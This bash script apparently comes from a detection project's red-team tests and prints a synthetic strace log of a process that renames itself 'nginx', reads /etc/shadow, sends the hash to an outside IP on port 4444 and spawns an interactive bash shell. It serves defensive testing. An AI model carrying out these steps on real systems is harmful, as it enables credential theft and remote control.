#!/usr/bin/env bash
# generate_prctl_masquerade.sh — Inject prctl comm masquerading trace (EVASION-08)
#
# Produces a strace-compatible log that simulates an attacker process that:
#   1. Starts as "malware" and renames itself to "nginx" via prctl(PR_SET_NAME)
#   2. Opens innocuous nginx config files to blend in
#   3. Reads /etc/shadow (credential dump)
#   4. Connects to a C2 server (data exfiltration)
#   5. Spawns /bin/bash (reverse shell)
#
# This tests SENTINEL's ability to detect MITRE T1036.004 (Masquerading: Rename
# Process Name) even when the attacker mimics a trusted system process.
#
# SENTINEL detection path:
#   Layer 1 (hard-trigger): PRCTL event → always hard-triggered
#   Layer 1 (hard-trigger): /etc/shadow read → immediate LLM invocation
#   Layer 4 (LTL):          AX-3 prctl→shadow  (CRITICAL)
#                           AX-1 nginx→bash    (CRITICAL)
#                           AX-2 shadow→exfil  (CRITICAL via Büchi)
#
# Usage:
#   bash scripts/generate_prctl_masquerade.sh > data/input/real_traces/evasion08_prctl.log
#   PYTHONPATH=src/python python3 src/python/evaluate_red_team.py

set -euo pipefail

FAKE_PID="${FAKE_PID:-28000}"
TIMESTAMP_START=1000000000

t() { echo "$((TIMESTAMP_START + $1))"; }

cat <<EOF
$(t 0) execve("/usr/bin/malware", ["malware"], /* 12 vars */) = 0
$(t 1000) openat(AT_FDCWD, "/proc/self/status", O_RDONLY) = 3
$(t 2000) read(3, "Name:\tmalware\n", 4096) = 14
$(t 3000) close(3) = 0
$(t 4000) prctl(PR_SET_NAME, "nginx", 0, 0, 0) = 0
$(t 5000) openat(AT_FDCWD, "/etc/nginx/nginx.conf", O_RDONLY) = 3
$(t 6000) read(3, "user www-data;\nworker_processes auto;\n", 4096) = 37
$(t 7000) close(3) = 0
$(t 8000) socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 4
$(t 9000) bind(4, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
$(t 10000) listen(4, 128) = 0
$(t 15000) openat(AT_FDCWD, "/etc/shadow", O_RDONLY) = 5
$(t 16000) read(5, "root:\$6\$rounds=500000\$...:\$...", 4096) = 512
$(t 17000) close(5) = 0
$(t 18000) socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
$(t 19000) connect(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("185.220.101.1")}, 16) = 0
$(t 20000) write(6, "root:\$6\$rounds=500000\$...", 512) = 512
$(t 21000) close(6) = 0
$(t 22000) execve("/bin/bash", ["/bin/bash", "-i"], /* 12 vars */) = 0
$(t 23000) +++ exited with 0 +++
EOF

echo "# EVASION-08: prctl masquerade trace generated (pid=$FAKE_PID)" >&2
echo "# Feed to evaluate_red_team.py or capture_real_traces.sh" >&2
echo "# Expected LTL violations: AX-1 (nginx→bash), AX-2 (shadow→exfil), AX-3 (prctl→shadow)" >&2
